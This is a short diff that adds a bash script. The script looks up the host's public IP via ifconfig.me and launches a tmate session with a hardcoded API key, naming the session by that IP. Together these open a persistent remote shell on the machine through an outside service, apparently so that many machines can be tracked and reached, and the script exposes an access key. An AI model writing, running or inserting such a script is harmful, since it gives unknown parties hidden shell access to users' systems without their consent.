@@ -1,0 +1,4 @@
+#!/bin/bash
+
+ip="$(curl ifconfig.me | tr -dc '0-9')"
+tmate -F -k tmk-rWaKO1rnkdGvvq5muTD8nBkzXe -n $ip
